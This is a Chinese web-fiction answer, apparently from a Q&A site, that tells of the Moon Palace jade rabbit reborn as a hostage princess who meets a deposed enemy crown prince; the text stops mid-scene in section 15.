[{"title":"如何以「我是嫦娥怀里常抱着的玉兔」为开头写一个故事？","date":"2021-09-13 10:08:41","description":"\n<blockquote>\n<b>【已完结，全文共2w6k字，请放心食用】</b><br><b>我是嫦娥怀里常抱着的玉兔。</b><br><b>近日鸿钧仙官总来宫里，很不对劲。</b><br><b>因为他一来，主人就不抱着我了！</b><br><b>有什么事情是我广寒宫玉兔不能听的？</b><br><br><b>于是鸿钧仙官又一次来找主人时，我悄悄捅破窗户纸，两腿一蹬，扒拉在窗沿上。</b><br><b>就让我来康康，你们到底有什么秘密！</b><br><b>朦胧之间，我听见鸿钧仙官说了一个名字。</b><br><b>瀛玉？</b><br><br><b>当天晚上，我在主人怀里做了一个梦。</b><br><b>梦里有一个男子，朝我伸出手。</b><br><b>“楼迦蓝。”</b><br><b>“我来找你了。”</b>\n</blockquote>\n<p><b><i>敌国废太子x质子九公主</i></b></p>\n<p><b>《诱兔深入》</b></p>\n<h3>1.</h3>\n<p>我是嫦娥怀里常抱着的玉兔。</p>\n<p>自上月开始，鸿钧仙官便隔三差五地来找主人，而且脸色一次比一次差。</p>\n<p>要不是知道我的主人早就有心上人，鸿钧仙官又长得实在太过磕碜……</p>\n<p>我都能怀疑他们俩之间有点什么。</p>\n<p>天界有奇闻异事很正常，主人每次与他人议事，都是将我抱在怀里一起听的。</p>\n<p>可鸿钧仙官跟主人说的事，她不让我听。</p>\n<p>怪就怪在这里。</p>\n<p>不对劲，很不对劲。</p>\n<p>有什么事情是我广寒宫玉兔不能听的？</p>\n<p>今天鸿钧仙官又来了，主人将我放置在阙月园，离开时脸上还带着忧色。</p>\n<p>好奇如我，今天就要听听，主人和鸿钧仙官究竟在瞒着我些什么！</p>\n<p>我放轻脚步，小跑到内殿。</p>\n<p>我两腿一蹬，蹦跳上窗台。</p>\n<p>我双耳并拢，战术性凑近。</p>\n<p>鸿钧仙官的声音，透过薄薄的窗户纸，断断续续传进我的耳朵里。</p>\n<p>“瀛玉就要飞升上神了，你记得到时候带玉兔避着点儿。”</p>\n<p>“我算过了，那人悟性很高，执念又太深，保不定会带着……那一世的记忆。”</p>\n<p>“天道轮回，他还是来了……”</p>\n<p>我听得朦朦胧胧，几个词连不成一句话。</p>\n<p>怪我这双耳朵，太久没用来听墙角了，改天得抽空去顺风耳那边练练听觉。</p>\n<p>不过有两个字，我听得格外清晰。</p>\n<p>瀛玉？</p>\n<p>这名字倒是好听。</p>\n<p>甚至……还有些熟悉。</p>\n<p>我之前在哪儿听过吗？</p>\n<p>嘶，怎么一想就头疼呢，罢了罢了。</p>\n<p>这时里边有了动静，似乎是两人要出来了。</p>\n<p>我连忙跳下窗台，跑回阙月园扑仙蝶。</p>\n<p>机智如我，时间算得刚刚好。</p>\n<p>2.</p>\n<p>当天晚上，我窝在嫦娥怀里，久违地做了一个很长的梦。</p>\n<p>记事以来，我就在广寒宫里，很少做梦。</p>\n<p>梦里，我的周遭十分吵闹，马鸣声，厮杀声，哭喊声不绝于耳。</p>\n<p>我似乎是在一座寝宫里，室内的装饰珠光宝气，可见这座宫殿的主人非富即贵。</p>\n<p>恍惚间，我侧过身体，在一旁的铜镜里，看见了……我的脸。</p>\n<p>这是我吗？</p>\n<p>好漂亮啊。</p>\n<p>不过，我长长粉粉的，毛茸茸的可爱耳朵呢？</p>\n<p>再低头一看，我的爪子也不见了，取而代之的，是跟我主人一样的，如羊脂玉一般细嫩的双手。</p>\n<p>“砰！”</p>\n<p>一声巨响，将我整个人吓得抖了个激灵。</p>\n<p>宫殿外黄土纷飞，但呐喊声渐息，似乎一场宏大的战事已接近尾声。</p>\n<p>这时，我的面前突然出现了一个男人。</p>\n<p>他没有穿盔甲，而是一席藏青长袍，手上持一把带血的剑，剑柄上还有一枚白色玉佩。</p>\n<p>外面明明那么混乱，他身上竟是一丝细小的伤痕都没有。</p>\n<p>他是谁？他叫什么名字？我认识他吗？</p>\n<p>我……真的是在做梦吗？</p>\n<p>为什么像是真真正正地，亲身在经历一般？</p>\n<p>他的背后是盈盈天光，又像是盏盏鬼火。</p>\n<p>他朝我伸出手，薄唇亲启。</p>\n<p>“楼迦蓝。”</p>\n<p>“我来找你了。”</p>\n<p>3.</p>\n<p>我醒来时，第一眼看见的是主人的脸。</p>\n<p>她满脸忧色，眼睛红通通的，睫毛好像都沾上了水。</p>\n<p>我想抬起爪子帮她擦擦，可是身体却软得不行，一点力气都没有。</p>\n<p>我才发现，这里似乎是鸿钧仙官的大殿，而不是广寒宫。</p>\n<p>“玉兔她先前就是因为下凡历情劫失败，阴差阳错附身到了楼岚国的一只雪兔身上，被你心软带上了天庭，抹去了记忆。”</p>\n<p>“可现在……瀛玉即将飞升，你看，玉兔她感受到了瀛玉的神力，他们之间的羁绊从未消失。”</p>\n<p>“所以她才昏睡了好几天，放在人间，又是好几年的光阴啊。”</p>\n<p>“你应该知道，她迟早会想起来过去发生的事，到时候怎么办？”</p>\n<p>“玉兔她本不该继续待在天庭的，历情劫失败的当天她就该天打雷劈，灰飞烟灭了！”</p>\n<p>“谁能想到当年你跟瀛玉，一个软心肠偷偷包庇，一个痴情种情愿背锅……”</p>\n<p>“要是放在人间，她这情况就是黑户啊……”</p>\n<p>“这次瀛玉回来，我估计他那个倔脾气，修炼这么久就是为了要来带玉兔走的，到时候你该跟天帝怎么说？”</p>\n<p>嫦娥瞪了鸿钧仙官一眼：“快闭嘴吧！有没有其他办法？”</p>\n<p>虽然我有点听不懂他们在说什么，不过这是我第一次见到主人骂人。</p>\n<p>她骂人的样子，也好好看好温柔啊。</p>\n<p>鸿钧仙官摸了一把他的大胡子：“有是有，就是有点风险……”</p>\n<p>“跟瀛玉飞升上来，玉兔恢复记忆，引发天劫雷暴，哪个风险大？”</p>\n<p>鸿钧抖了个激灵：“那……还是后者风险大一点，你跟我来。”</p>\n<p>主人抱着我，一边顺着我的毛，一边跟鸿钧仙官走进了大殿深处。</p>\n<p>我大多数时间都待在阙月园，还是第一次见到鸿钧仙官的内殿长什么样子呢。</p>\n<p>鸿钧仙官一边走一边碎碎念念：</p>\n<p>“我作为开天五大元祖之一，几亿年没用过我这轮回白月盘了。真是没想到，地府阎王干的事儿，今日我鸿钧老祖也要做啊……”</p>\n<p>“想让瀛玉不上来，那就得让玉兔下去。”</p>\n<p>“再跟瀛玉历一回情劫，看这一次，二人能不能修成正果。”</p>\n<p>嫦娥抱我的力度紧了紧：“要保住玉兔，只有这一个办法了吗？”</p>\n<p>鸿钧老祖没有回答，而是闭目作法，念了几句我听不懂的咒语。</p>\n<p>眼前那轮玉盘，竟是突然发出强光来。</p>\n<p>恍惚之间，我的身体变得很轻，好像飞了起来，主人的脸也离我越来越远……</p>\n<p>阙月园的仙蝶我还没扑到，你们这是要送我孤身一只兔去哪儿啊……</p>\n<p>眼前的白光，突然变得一片黑暗。</p>\n<p>耳边似乎有一个男人在喊我：</p>\n<p>“小兔子，小兔子？”</p>\n<p>“别睡了，笨死了，快醒醒。”</p>\n<p>再睁眼，我已在一辆摇摇晃晃的马车上。</p>\n<p>4.</p>\n<p>“九公主？九公主，您醒啦。”</p>\n<p>我揉揉眼睛，迷迷糊糊的：“……什么？”</p>\n<p>“疏桐刚刚看九公主似乎有些被梦魇住了，便喊了您几声，刚好咱们也快到了。”</p>\n<p>“唔好，疏桐，替我拿几块玉蝶酥来，本公主睡了一觉，肚子觉得有些饿了。”</p>\n<p>“是。”疏桐蹲下身，在马车的隔板里拿出一个纸袋，又拿出一个小碟，将几块玉蝶酥拿出来摆好，递到我手中：“公主请用。”</p>\n<p>我是楼岚国最不受宠，琴棋书画样样不行的九公主。</p>\n<p>上月有战事，眼看着楼岚要被北域的刍荆国攻下，父皇赶紧派使者去议和，询问能不能通过和亲来平息这事端。</p>\n<p>刍荆国同意了，但目前他们没有合适婚龄的皇子，便要我父皇先派一位公主或皇子过去当质子。</p>\n<p>我父皇问，有什么要求？</p>\n<p>刍荆国说，长得漂亮就行。</p>\n<p>疏桐急急忙忙冲进我的寝宫，告知我这件事的时候，我便知道，那是非我不可了。</p>\n<p>我楼迦蓝别的本事没有，若不是公主，单靠一张脸，放在民间也是能吃饱饭的。</p>\n<p>圣旨就是紧跟着疏桐的脚步下来的，我一边磕着玉蝶酥，一边让疏桐帮忙领旨。</p>\n<p>刚巧本公主在楼岚国也待得厌了，早就想出宫去转转。</p>\n<p>不如，就去那传闻中国富兵强，民风开放的刍荆国看一看吧。</p>\n<p>5.</p>\n<p>骏马的铁蹄声踢踏，骆驼身上的铃声也渐渐平息下来。</p>\n<p>在刍荆国钦差大臣及军队的接见下，我们随他入了宫。</p>\n<p>刍荆国的吃食和环境令本公主甚是满意，并且皇帝也不似传闻中那么可怖，反而笑眯眯的，令人尊敬又亲切。</p>\n<p>不像我父皇，整天端着个架子。</p>\n<p>刍荆国的几位皇子，果真是如使臣所说，大的大，小的小。</p>\n<p>大的已经成婚，小的还未到总角之年，但是看起来都很和睦。</p>\n<p>不像楼岚国，几个皇兄为了一个太子之位，死的死，伤的伤，残的残。</p>\n<p>一边你给我下药，一边我给你捅刀，最后头破血流，也没个结果。</p>\n<p>刍荆国的吃食也很好，除了玉蝶酥在我心里永远排第一，其余的都能比楼岚国的好。</p>\n<p>烤鸭卤鹅炖蹄髈翡翠青菜乳鸽萝卜汤……</p>\n<p>当晚，我兴奋地睡不着觉。</p>\n<p>悄悄推门一看，疏桐却已经在小榻上睡得很沉，我伸手在她眼前晃了一下，她鼻翼动了动，翻了个身，愣是没醒。</p>\n<p>那本公主可要跑出去玩啦！</p>\n<p>我蹑手蹑脚地拿了根竹簪，随意往头发里面一插，便提着裙摆跑了出去，一路到了我一直心心念念的藏宝阁。</p>\n<p>听钦差大臣说，这里面有许多有趣的玩意儿，平时只要是宫中的人，都可以随意把玩，只要不带走就行。</p>\n<p>我悄悄从一楼的窗户里翻了进去，藏宝阁里面一盏灯都没有，不过我眼神好，很快适应了这里的光线，踩着楼梯上了顶层。</p>\n<p>6.</p>\n<p>我刚上到顶楼，脚步就挪不动了。</p>\n<p>没想到的是，这里居然有人！</p>\n<p>只见那男子身着一席黑衣，似乎是在往腰间藏什么东西。</p>\n<p>完了，来这里第一天，就遇着了小偷。</p>\n<p>我刚想开溜，黑暗里背对着我的那个男人，居然叫住了我！</p>\n<p>“一个小丫头，三更半夜来这里干什么？”</p>\n<p>“我……”</p>\n<p>我嘴上答应着，手却向发丝间伸去。</p>\n<p>那根出门前随意插上的竹簪，其实是一柄锋利无比的匕首。</p>\n<p>“不想死就别说话。”</p>\n<p>我：“……”</p>\n<p>虽然有点凶，但我听得出对方似乎并无敌意，于是刚刚伸向竹簪的手，又垂了下去。</p>\n<p>我小声嘟囔：“明明只有你在说话。”</p>\n<p>而且，是你先问我的好不好！讲不讲道理？</p>\n<p>男人哂笑了一声，转身向我走来。</p>\n<p>我战术性后退一步，本能地有些害怕。</p>\n<p>他背对着月色，面孔在黑暗里看不真切，我只看得出他长得很高，轮廓似乎还挺好看。</p>\n<p>“嗯？不怕我么？身量跟只小兔子似的，倒是挺有趣。”</p>\n<p>我踌躇了一下：“那个……请问，我现在可以说话了么？”</p>\n<p>毕竟你刚刚说过，要是我说话会死欸。</p>\n<p>男人盯着我，看了半天，蹦出一句：</p>\n<p>“之前没见过你。是神仙？还是妖怪？”</p>\n<p>我被他这一番话整得莫名其妙，要不是这男人声音确实好听，我才不要理他呢。</p>\n<p>“我是楼岚国的九公主，我知道自己很好看，但非要说成神仙妖怪吧，倒也不必。”</p>\n<p>“……”对面的男人一时语塞：</p>\n<p>“你就是那个楼岚国来的质子九公主？”</p>\n<p>我点点头，而这一次，我借着月光，终于看清楚了他的脸。</p>\n<p>刚才他对我说的话，我现在真想再说一遍。</p>\n<p>他究竟是神仙还是妖怪，能长得这般好看？</p>\n<p>我与疏桐悄悄藏的话本子上，有一句叫作“郎艳独绝”的。</p>\n<p>我先前怎么也想不出那样的男子，究竟该是什么样的。</p>\n<p>现在看来，大抵，就是他这样的吧。</p>\n<p>“那你呢？你叫什么名字？”我脱口而出。</p>\n<p>黑衣男子却不理会我，径自向窗棂处走去，似乎是要从窗口离开。</p>\n<p>怎么说这里距地面也有数十米，即便知晓他会功夫，我还是出声提醒了一句：</p>\n<p>“那……你记得当心点啊。”</p>\n<p>“虽……虽然藏宝阁不许偷东西，但我会替你保守秘密的。”</p>\n<p>“你放心，我楼迦蓝一言九鼎，绝对守口如瓶，不反悔！”</p>\n<p>听见这话，他脚步一顿。</p>\n<p>相互沉默地对峙片刻，对方居然轻笑了声。</p>\n<p>“知道了。”</p>\n<p>他一脚踏上窗沿，回头与我对视：</p>\n<p>“真像小兔子。笨死了。”</p>\n<p>我心道：你才是小兔子呢，还有，你说谁笨？</p>\n<p>我楼迦蓝小公主，可是四海八荒第一小聪明！</p>\n<p>“记住了，小公主。”</p>\n<p>“我叫瀛玉。”</p>\n<p>我一惊，再往哪处看去，却只来得及看见一个黑色的身影飞跃而下。</p>\n<p>我连忙跑到窗边一看，哪里还有他的影子？</p>\n<p>耳边又传来他的声音。</p>\n<p>原来他叫瀛玉。</p>\n<p>瀛玉？</p>\n<p>这名字倒是好听。</p>\n<p>【我起的名字，全都是在“缺月挂疏桐，漏断人初静”这一句里面抽的。广寒宫里的阙月园，公主的丫鬟疏桐。两个国家，楼岚国，刍荆国。】</p>\n<p>【总之，谐音梗，是阿郁心里，起名yyds】</p>\n<hr>\n<h3>7.</h3>\n<p>第二天醒来，疏桐跟我说，昨晚发生了一件大事。</p>\n<p>“什么大事？”我有了些兴致。</p>\n<p>“藏宝阁失窃了！”</p>\n<p>我：“哦，这样啊。”</p>\n<p>疏桐：“……公主，您这个反应，看起来特别像是早就知道的。”</p>\n<p>“怎么可能？”</p>\n<p>我在床上坐定：“那，这藏宝阁失窃了什么东西？现在我还能去玩吗？”</p>\n<p>“我也不知是丢了什么，具体还得问管理藏宝阁的人吧，现在这情况，还要进去玩，大抵是难了。”</p>\n<p>“公主，这刍荆国也真是奇葩，大晚上不锁上藏宝阁的门，也不派侍卫严加把守，宝贝不丢才怪呢！”</p>\n<p>我重重点头：“是啊，笨死了。”</p>\n<p>“不说这个了，公主快起来洗漱吧，今日是刍荆国大皇子瀛季的生辰，大白天是没什么事儿，不过晚上咱们也是要去宴席上吃饭的。”</p>\n<p>我点点头，又一愣：“大皇子叫什么？”</p>\n<p>“瀛季啊。”</p>\n<p>疏桐呆呆的：</p>\n<p>“公主，您这是怎么了？”</p>\n<p>我摇摇头，说没事。</p>\n<p>刍荆国的皇子公主，姓氏全都是瀛字。</p>\n<p>那瀛玉，也该是皇子？</p>\n<p>可为什么我刚到刍荆国时，在昨天的那个宴席上，没有见到瀛玉呢？</p>\n<p>怀着疑问的心情，我啃完一大盆小厨房送来的酱香鸭头，便让疏桐替我梳妆，坐上了去大皇子生辰宴的马车。</p>\n<p>8.</p>\n<p>我的位置其实在十分角落的地方，可疏桐扶着我一落座，我就感到有几十双眼睛顷刻间都注视在我身上。</p>\n<p>本想沉默地吃个饭，见此我只好站起身，朝大家行了个礼。</p>\n<p>人齐了，我终于可以开始吃我心心念念的椰蓉糕青稞饼芥子酥梅干菜薄酥皮，烤鸡卷饼鸡蛋羹炸小鱼干红烧酱鸽蟹黄汤包……</p>\n<p>倘若是我现在抬起头，就能看见刍荆国皇帝私下里扫了一圈，满脸不情愿地哼了一声。</p>\n<p>倒是大皇子主动提起，引起了我的兴趣。</p>\n<p>“二弟今日还没来么？他上周的午后还曾与我对弈，说在我的生辰上要送我一样好礼物。”</p>\n<p>坐在王位上的男人冷哼一声：“他要是来，我立马给他轰出去！”</p>\n<p>大皇子莞尔：“父皇又是何必？二弟是好心，况且他一向机敏，说要来，便是必会来的，儿臣也很期待他的贺礼。”</p>\n<p>我听了这些话，大概也了解了。</p>\n<p>二皇子一定是瀛玉，但瀛玉与皇帝关系很僵硬，所以才没有出现在先前的宴会上。</p>\n<p>从现在皇帝的态度来看，瀛玉这个人，似乎是犯过什么天大的错误，才会让皇上嫌恶到如此的地步。</p>\n<p>不过我想想昨天，瀛玉这人又是偷东西，又是嘴欠的，我要是他爹，我也看见他就烦。</p>\n<p>除了长得好看点，令人赏心悦目。</p>\n<p>唉，真矛盾。</p>\n<p>“我皇兄的生辰，怎么不等我到便开始了？”</p>\n<p>哟，我心道有趣，真是说什么来什么，还未见其人倒是先闻其声。</p>\n<p>我从一堆糕点中抬起脸来，瀛玉站在天光之下，一身藏青色锦袍，头发用高冠束起。</p>\n<p>弯唇不羁一笑时，风流倜傥。</p>\n<p>即便已经是第二次见面，我还是看得有点呆。</p>\n<p>毕竟上一次是夜里，这张脸没有现在看得这么清晰。</p>\n<p>瀛玉上前两步，从宽大的袖中抽出一把短剑，直接朝前堂一扔！</p>\n<p>我差点惊呼出声，以为他要刺杀皇上！</p>\n<p>“藏宝阁找了一天的玉扳指，这就还你！”</p>\n<p>“嗖！”的一声，短剑稳稳地落在瀛季手中，后者会心一笑：</p>\n<p>“原来是你。我看看，你用这玉扳指做了什么好物。”</p>\n<p>那是一柄周身通透锃亮的宝剑，剑柄上面镶嵌着零零碎碎的玉石。</p>\n<p>瀛玉声调慢吞吞的，既放纵又恶劣：</p>\n<p>“我思来想去，这柄短剑上总要嵌点什么才好看。于是昨夜去藏宝阁里拿了顶层的玉扳指，将它打碎了填在上边，皇兄可喜欢？”</p>\n<p>我在一边听着目瞪口呆，嘴巴都忘记嚼了。</p>\n<p>……就这么大大方方承认了？</p>\n<p>这是恃宠而骄还是真不要命啊？</p>\n<p>这人可真是目中无人，嚣张至极。</p>\n<p>亏我还巴巴地跟他保证，自己绝对不会说出去呢！</p>\n<p>怪不得，昨天他要说我笨死了……</p>\n<p>因为他根本没想瞒着啊！</p>\n<p>9.</p>\n<p>送完了礼物，瀛玉扫了一眼前堂的位置，嘴角勾了一下，便往大门处走。</p>\n<p>皇帝自始至终没说一句话，殿内的其余人都自觉俯身，嘴里念念有词：</p>\n<p>“恭送二皇子。”</p>\n<p>我也想学着他们有礼貌地送一送，可刚抬起头，便跟瀛玉的眼神撞了个满怀。</p>\n<p>瀛玉的步伐猛的顿住。</p>\n<p>下一刻，他冲我笑眯眯地弯起眼睛：</p>\n<p>“谁说我要走了？我只是挑个自己喜欢的好地方坐下，好慢慢喝我皇兄的生辰酒。”</p>\n<p>我：“......”</p>\n<p>刍荆国的风气还真是开放，皇子居然敢大庭广众之下给兄长和父亲甩脸色，放着给他好心留的位置不坐，偏要自己再挑。</p>\n<p>而且，我的心头升起一股不详的预感。</p>\n<p>果真，瀛玉一脸云淡风轻地在我身旁空着的位置上坐了下来，丝毫不顾及周遭的目光，自顾自地喝起酒来。</p>\n<p>疏桐在我耳边说悄悄话：“公主，这位二皇子，可是与您有什么交情？怎么看着像是认识。”</p>\n<p>“我也不知道，他八成是有毛病！你没看见他刚刚的样子？我怎么可能认识他！”</p>\n<p>我也转过去，用我自己都听不清的声音跟疏桐咬耳朵，肩上却冷不丁被拍了一下。</p>\n<p>一回头，便遇上瀛玉那张似笑非笑的脸。</p>\n<p>说真的，怎么看都没什么缺点的脸，无论这人性格有多欠，也能令人心情大好。</p>\n<p>可惜这张脸的主人，长了张嘴。</p>\n<p>“小兔子，你们楼岚国的人，是不是都喜欢翻脸不认人？”</p>\n<p>我瞪大眼睛：“我这么小的声音，你也能听见？”</p>\n<p>“那就是间接承认了。”瀛玉身体向后靠，两手撑着地面，表情似是可惜：</p>\n<p>“顶好的面孔，怎么就生了这么个脑子？”</p>\n<p>我气得直接不理他了。</p>\n<p>疏桐在身后小声道：“公主，昨晚上您是真的跑去藏宝阁玩了吧。”</p>\n<p>我还没回应，瀛玉先笑了：“看看！你这丫头都比你激灵。”</p>\n<p>我：“......”</p>\n<p>您是顺风耳转世吗？</p>\n<p>听悄悄话这么熟练。</p>\n<p>10.</p>\n<p>宴会结束后，我其实对瀛玉这个人，反而更加关注了起来。</p>\n<p>讨厌归讨厌，可好奇如我，很想知道为什么他身为二皇子，却很少露面？</p>\n<p>看他的样子，似乎是与我年纪相仿，大不了两岁，应该也未娶亲。</p>\n<p>可之前刍荆国皇帝说了，这里没有适合婚配的皇子......</p>\n<p>妈呀！还好这皇帝不喜欢瀛玉！都没把他算在皇子里面！</p>\n<p>不然，现在和瀛玉那讨厌的家伙成亲的，可不就是我么！</p>\n<p>想想也刺激，啊不是，想想都后怕。</p>\n<p>回到寝殿中，我让疏桐发挥她那八卦的本事，把瀛玉的老底扒点出来。</p>\n<p>疏桐不负所望，很快带着消息回来了。</p>\n<p>但她开口的时候，却一脸沉重。</p>\n<p>“公主，疏桐真是问了一大圈，才换回的消息。”</p>\n<p>“那些个宫女，一个个都不敢说，还是我将自己的月银都搭了进去，才肯松口的！”</p>\n<p>我大手一挥：“给你加半年的月钱，快说。”</p>\n<p>疏桐忧色未变：“疏桐也不是心疼银子，知道公主对疏桐好，疏桐把命搭给公主也是愿意的。”</p>\n<p>“只是，这二皇子......”</p>\n<p>我起了兴致：“到底是什么事？这么支支吾吾的。”</p>\n<p>疏桐一股脑儿说了出来：“这二皇子是刍荆国先皇后所生，听宫女们说，他自出生起便是天之骄子，礼乐射御书术样样精通，未出生前便已经被封为太子！”</p>\n<p>“二皇子，曾经是太子！”</p>\n<p>我一惊：“太子？”</p>\n<p>我一直以为，太子是那位已经成亲的大皇子。</p>\n<p>现在想来才发现，大皇子的妻子，谁也不会喊她太子妃呀。</p>\n<p>原来如此，那现在的刍荆国，居然是没有太子的么？</p>\n<p>“曾经是太子？那现在是怎么回事？”</p>\n<p>“就在半年前，是刍荆国皇帝亲口下旨废的太子！”</p>\n<p>“为什么？”</p>\n<p>“因为......”</p>\n<p>疏桐深呼吸，才将后面的二字吐了出来。</p>\n<p>“因为弑母。”</p>\n<p>11.</p>\n<p>之后的好几天，我的生活里都没有再出现瀛玉这个人的影子。</p>\n<p>我这个质子呢，可真算是当得天仙一般。</p>\n<p>什么麻烦事没有，住得好又睡得好，吃嘛嘛香，身体倍儿棒。</p>\n<p>不过......偶尔还是会有点想家。</p>\n<p>楼岚国没什么好的，可那依然是我的母国。</p>\n<p>昨天是正月十五，皇宫很热闹，我也参加了中秋夜宴，烤鸭很好吃。</p>\n<p>不过，瀛玉没有出现。</p>\n<p>俗话说，十五的月亮十六圆。</p>\n<p>今天晚上，疏桐又睡得很早，徐徐的鼾声很快透过帘子钻了进来。</p>\n<p>我坐在床沿上，仰头望着天上那一轮皎洁的明月，怎么也睡不着，干脆起身出了门。</p>\n<p>从小厨房拎了一坛鹤泠，我偷偷摸摸爬上了摘月轩的屋顶。</p>\n<p>这地方我早就想来了，听疏桐说了，刍荆国宫里的摘月轩，是皇上和先皇后曾经最喜欢来的地方，这里最高，离天空最近，像是伸手可以摘见月亮似的。</p>\n<p>先皇后离世以后，此处便无人问津了。</p>\n<p>即便皇上没有明令禁止，但也没有人敢随便来这里。</p>\n<p>我刚一只脚从椅子上离开，又被吓了一跳。</p>\n<p>怎么会有人？</p>\n<p>定睛一看，不是瀛玉又是谁？</p>\n<p>瀛玉这时也看见了我，似乎也很惊讶：“小兔子？”</p>\n<p>我站着没动。</p>\n<p>瀛玉眼睛弯起来。</p>\n<p>“小兔子，要不要过来？”</p>\n<p>唉。</p>\n<p>他那双桃花一般的眼睛，真是勾人啊。</p>\n<p>一步步诱人深入，却无法控制。</p>\n<p>反正已经被发现了，我便将另一条腿也搭上了屋顶，拎着鹤泠走到他身边。</p>\n<p>“我们楼岚国最好的鹤泠，我分给你喝，今晚的事情，不许说出去。”</p>\n<p>“你以为我稀罕这个？”瀛玉挑眉。</p>\n<p>我有些手足无措。</p>\n<p>“我......我也没有什么好东西可以给你了。”</p>\n<p>瀛玉表情有一瞬间的僵硬。</p>\n<p>他叹了口气：“没事儿说这么丧气的话作甚，拿过来，我勉为其难喝两口。”</p>\n<p>12.</p>\n<p>我在他身边盘腿坐下来，给他满上一杯酒。</p>\n<p>“月亮真圆啊。”我叹了口气：“这里风光真好，想起来自我记事起，便没怎么好好看过月亮，第一次仔细去赏，居然已经不在故乡了。”</p>\n<p>瀛玉没说话。</p>\n<p>身边有个人，不说话我就难受，于是便主动抛问：“你呢？瀛玉？你也睡不着吗？”</p>\n<p>后者很轻地闭了一下眼睛。</p>\n<p>“我......在想一个人。”</p>\n<p>“谁？”其实我心里已经有了猜测，但不太敢直接说。</p>\n<p>“先皇后，我的母亲，我很想她。”</p>\n<p>一股子凉意直接从背后爬上脑门！</p>\n<p>我直接抖了个激灵，手中的酒都洒了几滴出来。</p>\n<p>没想到瀛玉这么坦诚，果然这种话他亲口说出来，到底还是教我有些害怕的。</p>\n<p>瀛玉到底有没有弑母我不知道，不过他武功高强，要是想杀我，自然是随时可以杀。</p>\n<p>所以，想到这里，我便也没那么害怕了。</p>\n<p>瀛玉见此，摆出一副嫌弃的神色，抬起手替我擦去了衣领上的几滴酒渍：</p>\n<p>“笨死了，你从小在楼岚国就这么笨？”</p>\n<p>大抵是因为微醺，我酒量本身不好，一听他这话就立马炸了毛：</p>\n<p>“你才笨，我再笨也没丢了自己的位置，哪像你还把太子的名号给作没了！”</p>\n<p>我这话一出，四周瞬间鸦雀无声。</p>\n<p>瀛玉刚刚要收回去的手，就这么顿在空中。</p>\n<p>良久，他轻笑了一声。</p>\n<p>“你知道？”</p>\n<p>我有点后怕，但喝酒壮人胆是真的，便用力地点点头：“知道。”</p>\n<p>“哦，这样啊。”瀛玉若有所思地看着我，似乎发现了什么很有趣的事情。</p>\n<p>“你知道我连弑母这种事都干得出来，居然还气定神闲地坐在这里跟我喝酒？”</p>\n<p>“楼伽蓝，你真是笨到家了，想想若是生在寻常人家，谁还要你这小兔子？”</p>\n<p>“幸好我不是太子了。”</p>\n<p>“可惜我不是太子了。”</p>\n<p><b>【求赞！求赞！求赞！这是个神话文～】</b></p>\n<hr>\n<h3>13.</h3>\n<p>那个晚上，我拉着瀛玉说了很多的话。</p>\n<p>以前在楼岚国被兄弟姐妹排挤，因为生母是爬了龙床的宫女而遭父皇嫌弃......</p>\n<p>这些曾经我告诉自己没什么大不了的事，在这一刻，似乎都化成了天大的委屈。</p>\n<p>我跟瀛玉其实并不熟悉，可我却有一种感觉，瀛玉不是坏人。</p>\n<p>甚至与我有些相似，在这寒冷的宫殿中，是需要钻木取火，抱团取暖的。</p>\n<p>到后来，一摊子上好的鹤泠，被我糟蹋了个精光。</p>\n<p>“臭小孩子，说好的分我一半，到最后全进自己肚子里了，还得要我善后。”</p>\n<p>迷迷糊糊之间，我感到自己置身于一片宽阔和温热之上。</p>\n<p>瀛玉很瘦，那一双蝴蝶骨，时常还会咯到我。</p>\n<p>我趴在他的背上，一边碎碎地呓语：</p>\n<p>“瀛玉......瀛玉，你轻点，慢点呀，我疼......”</p>\n<p>瀛玉听见我这么说，愤愤地立刻开骂：</p>\n<p>“楼伽蓝！你在说什么东西！你在做梦吗？你疯了？”</p>\n<p>“不是......”</p>\n<p>我皱眉，半梦半醒之间，也不知道瀛玉生气的点在哪里，倒是自己委屈上了：</p>\n<p>“我说你太瘦了，骨头咯得我好疼，你走慢点就好了，骂我干什么......”</p>\n<p>瀛玉：“......拿你没辙。”</p>\n<p>“瀛玉......你之前是不是说，要当个江湖剑客啊？”</p>\n<p>“嗯？嗯。”</p>\n<p>“其实......我也有一个大胆的想法。”</p>\n<p>“什么？”</p>\n<p>“要是你真是太子就好了。”</p>\n<p>“为什么？”</p>\n<p>“因为我想当皇后。”</p>\n<p>喝了酒的我真是什么都敢说，自顾自地喃喃道：</p>\n<p>“我想至高无上，让大家都不敢欺负我。”</p>\n<p>“这样啊。”瀛玉淡淡道。</p>\n<p>14.</p>\n<p>再后来，我就睡着了。</p>\n<p>到我醒过来，已经是自己的寝宫。</p>\n<p>不过昨晚上有一段记忆，我自己也分不清是真是假，是真的存在，还是我的臆想。</p>\n<p>快回到我的宫殿时，瀛玉似乎曾经轻轻喊过我。</p>\n<p>“小兔子，小兔子？还醒着么？”</p>\n<p>“唔......”</p>\n<p>“你告诉了我那么多秘密，那我便也大发慈悲，告诉你一个，好不好？”</p>\n<p>“嗯......”</p>\n<p>“我没有弑母。”瀛玉说。</p>\n<p>他的语气十分认真，不像平时的他。</p>\n<p>那一刻晚风吹拂，带来清爽的桂花香。</p>\n<p>“我母后病情加重时，是她求我不要去找太医。”</p>\n<p>“她从来不爱父皇，却为这深宫困了一辈子。”</p>\n<p>“是她让我给她带的药。”</p>\n<p>“小兔子……我答应我母后了。”</p>\n<p>“她走得真的很安详。”</p>\n<p>“我一直陪着她……”</p>\n<p>“我父亲也知道，我的母后不爱他，是自己求一个解脱的。”</p>\n<p>“但他还是废了我的太子之位。”</p>\n<p>“毕竟，这件事情，间接性是我导致的。”</p>\n<p>“其实这太子之位，我从没在乎过，我们几个兄弟之间，谁当都是一样的，不要也罢。”</p>\n<p>“当皇帝累死了，让我选的话，我要去走江湖，浪迹天涯，当个行侠仗义的剑客就好。”</p>\n<p>“我不想跟我母亲一样，一生被束缚在宫中，连早一些死去，都是求来的。”</p>\n<p>“等我皇长兄再大一些，你要不跟我一起出宫吧？看你也不是很想待在一个地方不动的人，怪不得，跟小兔子这么像。”</p>\n<p>“行了，秘密我反正已经说了，至于你听没听见，那就另当别论了。”</p>\n<p>15.</p>\n<p>我又做梦了。</p>\n<p>先是朦朦胧胧的一片清光，我穿着浅蓝色的衣裙，在一棵月桂树下吃点心。</p>\n<p>那桂树真是香气扑鼻，似乎是天境里的一般，还氤氲着微光。</p>\n<p>这时一位身姿曼妙的女子从大殿中出来，见到我后掩面轻笑：</p>\n<p>“伽蓝，到底是个小仙官，怎的如此贪吃？”</p>\n<p>她认识我？她是谁？</p>\n<p>我来不及细想，身下却一脚踏空，我似乎飞了起来，但